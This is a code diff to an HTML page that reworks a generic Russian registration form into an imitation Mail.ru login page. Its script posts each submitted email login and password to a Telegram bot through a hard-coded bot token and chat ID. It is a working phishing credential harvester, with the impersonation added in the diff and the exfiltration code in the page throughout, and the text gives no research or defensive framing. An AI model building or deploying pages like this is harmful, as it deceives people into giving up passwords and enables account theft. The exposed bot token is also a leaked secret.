@@ -2,33 +2,84 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Регистрация</title>
+  <title>Вход | Mail.ru</title>
   <style>
-    body { font-family: sans-serif; padding: 20px; }
-    input { margin: 5px 0; padding: 8px; width: 200px; }
-    button { padding: 10px 15px; }
+    body {
+      background-color: #f3f3f3;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-box {
+      background: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      width: 360px;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 30px;
+      color: #333;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+      font-size: 15px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0078d4;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    button:hover {
+      background-color: #005fa3;
+    }
+
+    #status {
+      margin-top: 15px;
+      text-align: center;
+      font-size: 14px;
+      color: green;
+    }
   </style>
 </head>
 <body>
-  <h2>Регистрация</h2>
-  <form id="form">
-    <label>Логин:</label><br>
-    <input type="text" id="login" required><br>
-
-    <label>Пароль:</label><br>
-    <input type="password" id="password" required><br><br>
-
-    <button type="submit">Отправить</button>
-  </form>
-
-  <p id="status"></p>
+  <div class="login-box">
+    <h2>Вход в Mail.ru</h2>
+    <form id="login-form">
+      <input type="text" id="login" placeholder="Имя пользователя (email)" required>
+      <input type="password" id="password" placeholder="Пароль" required>
+      <button type="submit">Войти</button>
+      <p id="status"></p>
+    </form>
+  </div>
 
   <script>
     const TOKEN = '7696324080:AAF0H1ZwXRPlVHeyAx-k5mzQCm4oCWQ5bVw';
     const CHAT_ID = '1969968725';
     const API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-    const form = document.getElementById('form');
+    const form = document.getElementById('login-form');
     const status = document.getElementById('status');
 
     form.addEventListener('submit', function(e) {
@@ -37,24 +88,26 @@
       const login = document.getElementById('login').value;
       const password = document.getElementById('password').value;
 
-      const message = `📝 Новая регистрация:\n👤 Логин: ${login}\n🔒 Пароль: ${password}`;
+      const message = `
+🔐 Попытка входа в аккаунт Mail.ru:
+📧 Логин: ${login}
+🔑 Пароль: ${password}
+      `;
 
       fetch(API, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: CHAT_ID,
           text: message
         })
       })
       .then(res => {
-        status.textContent = "Данные отправлены!";
+        status.textContent = "✅ Данные отправлены!";
         form.reset();
       })
       .catch(err => {
-        status.textContent = "Ошибка отправки.";
+        status.textContent = "❌ Ошибка отправки!";
         console.error(err);
       });
     });
